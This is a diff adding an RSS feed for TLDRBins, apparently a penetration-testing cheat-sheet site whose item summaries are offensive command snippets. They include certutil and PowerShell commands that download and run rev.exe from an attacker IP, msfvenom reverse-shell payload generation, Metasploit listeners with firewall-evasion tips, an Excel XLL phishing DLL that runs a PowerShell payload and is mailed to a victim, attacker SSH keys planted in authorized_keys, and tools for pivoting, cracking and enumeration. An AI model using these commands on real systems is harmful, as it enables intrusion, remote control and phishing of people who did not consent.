@@ -1,0 +1,151 @@
+<?xml version="1.0" encoding="utf-8" standalone="yes"?>
+<rss version="2.0" xmlns:atom="http://www.w3.org/2005/Atom">
+  <channel>
+    <title>TLDRBins</title>
+    <link>https://tldrbins.github.io/</link>
+    <description>Recent content on TLDRBins</description>
+    <generator>Hugo</generator>
+    <language>en-us</language>
+    <atom:link href="https://tldrbins.github.io/index.xml" rel="self" type="application/rss+xml" />
+    <item>
+      <title>Compressed Files</title>
+      <link>https://tldrbins.github.io/zip/</link>
+      <pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate>
+      <guid>https://tldrbins.github.io/zip/</guid>
+      <description>zip # zip a file zip file.zip file # zip a folder zip -r folder.zip folder/ # unzip unzip file.zip Note: Always put the zip file inside a new folder before unzip&#xA;tar.gz # Compress a file tar -cvzf file.tar.gz file # Compress a folder tar -cvzf folder.tar.gz folder/ # Extract tar -xvzf file.tar.gz Note: Always put the zip file inside a new folder before Extract&#xA;gz # Compress file, and keep the original file gzip -k -r file # Compress all files individually inside a folder, and keep original files gzip -k -r folder/ # Extract gunzip file.</description>
+    </item>
+    <item>
+      <title>Connection from Public Internet</title>
+      <link>https://tldrbins.github.io/public_internet_acess/</link>
+      <pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate>
+      <guid>https://tldrbins.github.io/public_internet_acess/</guid>
+      <description>Simply Catch HTTP Request webhook.site webhook.site&#xA;Catch HTTP Request and Host a Web Server serveo.net # Redirect http request to localhost:3000 ssh -R 80:localhost:3000 serveo.net # Start a local HTTP server python3 -m http.server 3000 ngrok Download ngrok&#xA;ngrok http 80 Note: ngrok free will show a warning message and require user accpet to proceed Note: Not good for XSS</description>
+    </item>
+    <item>
+      <title>DNS Enum</title>
+      <link>https://tldrbins.github.io/dns/</link>
+      <pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate>
+      <guid>https://tldrbins.github.io/dns/</guid>
+      <description> Zone Transfer dig test.com axfr @10.10.11.10 Domain Discovery dig @10.10.11.10 test.com dig @10.10.11.10 -x 10.10.11.10 dig @10.10.11.10 +short test.com any dig @10.10.11.10 -t NS test.com dig @10.10.11.10 _gc.test.com </description>
+    </item>
+    <item>
+      <title>File Transfer (Linux To Linux)</title>
+      <link>https://tldrbins.github.io/file_transfer_linux_to_linux/</link>
+      <pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate>
+      <guid>https://tldrbins.github.io/file_transfer_linux_to_linux/</guid>
+      <description>HTTP # Start a local HTTP server python3 -m http.server 80 # wget wget http://10.10.14.10/file # curl curl http://10.10.14.10/file -o /tmp/file nc # In our local Linux machine nc -lvnp 4444 &amp;lt; file # In target Linux machine nc -w3 10.10.14.10 4444 &amp;gt; file scp Remote to Local # If you have target password scp user@10.10.11.10:/tmp/remote/file /tmp/local/file # If you have assh key scp -i id_rsa user@10.10.11.10:/tmp/remote/file /tmp/local/file Local to Remote # If you have target password scp /tmp/local/file user@10.</description>
+    </item>
+    <item>
+      <title>File Transfer (Linux to Windows)</title>
+      <link>https://tldrbins.github.io/file_transfer_linux_to_windows/</link>
+      <pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate>
+      <guid>https://tldrbins.github.io/file_transfer_linux_to_windows/</guid>
+      <description>HTTP Start a Local HTTP Server python3 -m http.server 80 cmd certutil -urlcache -split -f http://10.10.14.10/rev.exe c:\windows\tasks\rev.exe # Upload and Run certutil -urlcache -split -f http://10.10.14.10/rev.exe c:\windows\tasks\rev.exe &amp;amp;&amp;amp; c:\windows\tasks\rev.exe powershell # Long version Invoke-WebRequest http://10.10.14.10/rev.exe -OutFile c:\windows\tasks\rev.exe # Short version iwr http://10.10.14.10/rev.exe -o c:\windows\tasks\rev.exe Note: PowerShell 3.0+&#xA;# Long version powershell.exe -ExecutionPolicy bypass curl 10.10.14.10/rev.exe -o c:\windows\tasks\rev.exe # Short version powershell -ep bypass curl 10.10.14.10/rev.exe -o c:\windows\tasks\rev.exe Note: curl is not always available</description>
+    </item>
+    <item>
+      <title>File Transfer (Windows To Linux)</title>
+      <link>https://tldrbins.github.io/file_transfer_windows_to_linux/</link>
+      <pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate>
+      <guid>https://tldrbins.github.io/file_transfer_windows_to_linux/</guid>
+      <description>SMB Start a Local SMB Server impacket-smbserver share . -smb2support cmd # Connect to SMB server without creds net use \\10.10.14.10\share # Connect to SMB server with creds net use \\10.10.14.10\share /u:user password # From target Windows to local Linux copy test.txt \\10.10.14.10\share # From local Linux to target Windows copy \\10.10.14.10\share\test.txt test.txt # Delete file del test.txt # Remove SMB share net use /d \\10.13.14.10\share Base64 Encoding (for small binary) # In target Windows [System.</description>
+    </item>
+    <item>
+      <title>Listeners</title>
+      <link>https://tldrbins.github.io/listeners/</link>
+      <pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate>
+      <guid>https://tldrbins.github.io/listeners/</guid>
+      <description> nc rlwrap nc -lvnp 1337 pwncat Download pwncat&#xA;pwncat-cs -lp 1337 #After getting a connection (local) back </description>
+    </item>
+    <item>
+      <title>Metasploit Listener</title>
+      <link>https://tldrbins.github.io/metasploit_listener/</link>
+      <pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate>
+      <guid>https://tldrbins.github.io/metasploit_listener/</guid>
+      <description>Start a Metasploit Listener msfconsole -q use exploit/multi/handler set payload windows/meterpreter/reverse_tcp set lhost 10.10.14.10 set lport 443 run Note: Try to use common ports such as 53, 80, 443 to bypass firewall outbound rules&#xA;If the shell die immediately, we can try to migrate it to another process # Create a automigrate.rc script run post/windows/manage/migrate msfconsole -q use exploit/multi/handler set payload windows/meterpreter/reverse_tcp set lhost 10.10.14.10 set lport 443 set AutoRunScript multi_console_command -r automigrate.</description>
+    </item>
+    <item>
+      <title>Metasploit Shellcode</title>
+      <link>https://tldrbins.github.io/metasploit_shellcode/</link>
+      <pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate>
+      <guid>https://tldrbins.github.io/metasploit_shellcode/</guid>
+      <description>Generate Metasploit Shellcode Windows x64 EXE msfvenom -p windows/x64/meterpreter/reverse_tcp -a x64 -f exe LHOST=10.10.14.10 LPORT=443 &amp;gt; rev.exe Windows x86 EXE msfvenom -p windows/meterpreter/reverse_tcp -a x86 -f exe LHOST=10.10.14.10 LPORT=443 &amp;gt; rev.exe Windows x64 DLL msfvenom -p windows/x64/meterpreter/reverse_tcp -a x64 -f dll LHOST=10.10.14.10 LPORT=443 &amp;gt; rev.dll Note 1: These will be flagged by AV Note 2: Try to use common ports such as 53, 80, 443 to bypass firewall outbound rules</description>
+    </item>
+    <item>
+      <title>Network Discovery</title>
+      <link>https://tldrbins.github.io/network_discovery/</link>
+      <pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate>
+      <guid>https://tldrbins.github.io/network_discovery/</guid>
+      <description> Test Connectivity ping -c3 10.10.11.10 Test Reverse Connectivity sudo tcpdump -ni tun0 icmp Use ping to Scan Subnet for i in $(seq 1 254); do (ping -c 1 10.100.10.${i} | grep &amp;#34;bytes from&amp;#34; &amp;amp;); done; Use nc to Scan Ports for i in $(seq 1 65535); do nc -zvn 127.0.0.1 ${i}; done Check ARP arp -na cat /proc/net/arp Check IP # Linux ifconfig # Windows ipconfig ip addr cat /proc/net/fib_trie Check Network Connections # TCP netstat -plant # UDP netstat -plunt # Windows netstat -ano </description>
+    </item>
+    <item>
+      <title>Network Traffic Pivoting</title>
+      <link>https://tldrbins.github.io/network_traffic_privoting/</link>
+      <pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate>
+      <guid>https://tldrbins.github.io/network_traffic_privoting/</guid>
+      <description>Chisel Download chisel&#xA;Start a Local chisel Server # In our local Linux machine ./chisel server --reverse --port 8000 chisel with ports # In target machine ./chisel client 10.10.14.10:8000 R:8080:127.0.0.1:8080 # Mutiple ports fowarding, can be different targets in the same subnet ./chisel client 10.10.14.10:8000 R:8080:172.17.0.2:8080 R:5000:172.17.0.3:5000 chisel with socks5 # In our local Linux machine sudo nano /etc/proxychains4.conf # Add to the end of the file socks5 127.0.0.1 1080 # In target machine .</description>
+    </item>
+    <item>
+      <title>Nmap</title>
+      <link>https://tldrbins.github.io/nmap/</link>
+      <pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate>
+      <guid>https://tldrbins.github.io/nmap/</guid>
+      <description>Nmap Port Scan TCP Scan target=10.10.11.10 nmap -p- --min-rate 10000 -oA ./nmap-alltcp $target ports=$(cat nmap-alltcp.nmap| grep -Eo &amp;#34;^[0-9]+&amp;#34; | tr &amp;#39;\n&amp;#39; &amp;#39;,&amp;#39; | sed -r &amp;#39;s/,$//&amp;#39;) nmap -p $ports -sCV -oA ./nmap-tcpscripts $target UDP Scan (common ports) target=10.10.11.10 nmap -sU --min-rate 10000 -oA ./nmap-udp $target ports=$(cat nmap-udp.nmap| grep -Eo &amp;#34;^[0-9]+&amp;#34; | tr &amp;#39;\n&amp;#39; &amp;#39;,&amp;#39; | sed -r &amp;#39;s/,$//&amp;#39;) nmap -p $ports -sU -sCV -oA ./nmap-udpscripts $target Scan with nmap scripts Update scripts DB nmap --script-updatedb Search scripts nmap --script-help ftp* Scan with scripts nmap --script=ftp-anon -sV -sC -p 21 10.</description>
+    </item>
+    <item>
+      <title>Password Cracking</title>
+      <link>https://tldrbins.github.io/password_cracking/</link>
+      <pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate>
+      <guid>https://tldrbins.github.io/password_cracking/</guid>
+      <description>john Download john&#xA;Convert file to john hash format # For example ssh2john id_rsa_encrypted &amp;gt; hash keepass2john test.kdbx &amp;gt; hash zip2john test.zip &amp;gt; hash # Get a full list of *2john find / -name *2john 2&amp;gt;/dev/null Crack with john # General use john --wordlist=/usr/share/wordlists/rockyou.txt hash # Specify hash format john --wordlist=/usr/share/wordlists/rockyou.txt hash --format=Raw-SHA512 # Show cracked hash john --show hash # Show cracked hash with specific format john --show hash --format=Raw-SHA512 hashcat # Auto detect hash format hashcat hash # Specify hash format hashcat -m 13400 -a 0 hash /usr/share/wordlists/rockyou.</description>
+    </item>
+    <item>
+      <title>Phishing</title>
+      <link>https://tldrbins.github.io/phishing/</link>
+      <pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate>
+      <guid>https://tldrbins.github.io/phishing/</guid>
+      <description>Phishing with XLL (Excel) revshells.com&#xA;shell.c #include &amp;lt;windows.h&amp;gt; __declspec(dllexport) void __cdecl xlAutoOpen(void); void __cdecl xlAutoOpen() { // Triggers when Excel opens WinExec(&amp;#34;&amp;lt;PowerShell #3 Base64 Payload&amp;gt;&amp;#34;, 1); // Replace your payload } BOOL APIENTRY DllMain( HMODULE hModule, DWORD ul_reason_for_call, LPVOID lpReserved ) { switch (ul_reason_for_call) { case DLL_PROCESS_ATTACH: case DLL_THREAD_ATTACH: case DLL_THREAD_DETACH: case DLL_PROCESS_DETACH: break; } return TRUE; } Compile shell.c using Linux x86_64-w64-mingw32-gcc -fPIC -shared -o shell.xll shell.c -luser32 Send email with the malicious xll file swaks --to &amp;#34;victim@victim.</description>
+    </item>
+    <item>
+      <title>Share Mount</title>
+      <link>https://tldrbins.github.io/share_mount/</link>
+      <pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate>
+      <guid>https://tldrbins.github.io/share_mount/</guid>
+      <description> Share Mount #Mount smb share locally for easy access sudo mount -t cifs &amp;#34;//10.10.11.10/Remote Shares&amp;#34; /mnt </description>
+    </item>
+    <item>
+      <title>SMB Enumeration</title>
+      <link>https://tldrbins.github.io/smb_enum/</link>
+      <pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate>
+      <guid>https://tldrbins.github.io/smb_enum/</guid>
+      <description>SMB Share Enum Login without password smbmap smbmap -H 10.10.11.10 smbmap -H 10.10.11.10 -u null smbclient smbclient -N -L \\\\10.10.11.10\\ #After found an accessible share smbclient -N \\\\10.10.11.10\\share\\ #After connection #List all files in a share recurse ON ls #Download all files mask &amp;#34;&amp;#34; recurse ON prompt OFF mget * Login with password smbclient -L \\\\10.10.11.10\\ -U domain/username%password #After found an accessible share smbclient \\\\10.10.11.10\\share\\ -U domain/username%password Mount SMB Share sudo mount -t cifs &amp;#34;//10.</description>
+    </item>
+    <item>
+      <title>SMB Server</title>
+      <link>https://tldrbins.github.io/smb_server/</link>
+      <pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate>
+      <guid>https://tldrbins.github.io/smb_server/</guid>
+      <description> Start a SMB Server for File Transfer Common Use impacket-smbserver share . -smb2support With Creds impacket-smbserver share . -smb2support -username test -password test Note: Sometimes smb server with creds may not work&#xA;For older Windows Machines impacket-smbserver share . </description>
+    </item>
+    <item>
+      <title>SSH</title>
+      <link>https://tldrbins.github.io/ssh/</link>
+      <pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate>
+      <guid>https://tldrbins.github.io/ssh/</guid>
+      <description>Generate SSH Key ssh-keygen #Set filename, leave passphase blank ./id_rsa #After Creation chmod 600 id_rsa Add SSH Access to Target cat id_rsa.pub #Copy and Paste to Target echo &amp;#39;&amp;lt;id_rsa.pub&amp;gt;&amp;#39; &amp;gt;&amp;gt; /home/user/.ssh/authorized_keys Connect to SSH with id_rsa ssh user@10.10.11.10 -i id_rsa Note: Always append a new line in id_rsa key&#xA;Connect to SSH with creds ssh user@10.10.11.10 # After first connection (i.e., after &amp;#39;yes&amp;#39; to fingerprint prompt) sshpass -p &amp;#39;password&amp;#39; ssh user@10.</description>
+    </item>
+    <item>
+      <title>Subdomain Enum</title>
+      <link>https://tldrbins.github.io/subdomain_enum/</link>
+      <pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate>
+      <guid>https://tldrbins.github.io/subdomain_enum/</guid>
+      <description> wfuzz download wfuzz&#xA;# HTTP wfuzz -w /usr/share/seclists/Discovery/DNS/bitquark-subdomains-top100000.txt -H &amp;#34;Host: FUZZ.example.com&amp;#34; -u http://example.com # HTTPS wfuzz -w /usr/share/seclists/Discovery/DNS/bitquark-subdomains-top100000.txt -H &amp;#34;Host: FUZZ.example.com&amp;#34; -u https://example.com -k Take note of the word size, Ctrl+C to interrupt the process, then run again wfuzz -w /usr/share/seclists/Discovery/DNS/bitquark-subdomains-top100000.txt -H &amp;#34;Host: FUZZ.example.com&amp;#34; -u http://example.com --hw 10 </description>
+    </item>
+    <item>
+      <title>Web Directory Enum</title>
+      <link>https://tldrbins.github.io/web_directory_enum/</link>
+      <pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate>
+      <guid>https://tldrbins.github.io/web_directory_enum/</guid>
+      <description> Web Directory Enum feroxbuster Download feroxbuster&#xA;HTTP feroxbuster -u http://example.com/ --depth 1 --methods=GET,POST -w /usr/share/seclists/Discovery/Web-Content/raft-medium-directories.txt HTTPS feroxbuster -u https://example.com/ -k --depth 1 --methods=GET,POST -w /usr/share/seclists/Discovery/Web-Content/raft-medium-directories.txt Specify Extension feroxbuster -u http://example.com/ --methods=GET,POST --depth=1 -w /usr/share/seclists/Discovery/Web-Content/raft-medium-words.txt -x html, asp, aspx gobuster Download gobuster&#xA;gobuster dir -u http://example.com -w /usr/share/seclists/Discovery/Web-Content/raft-medium-words.txt -x php </description>
+    </item>
+  </channel>
+</rss>
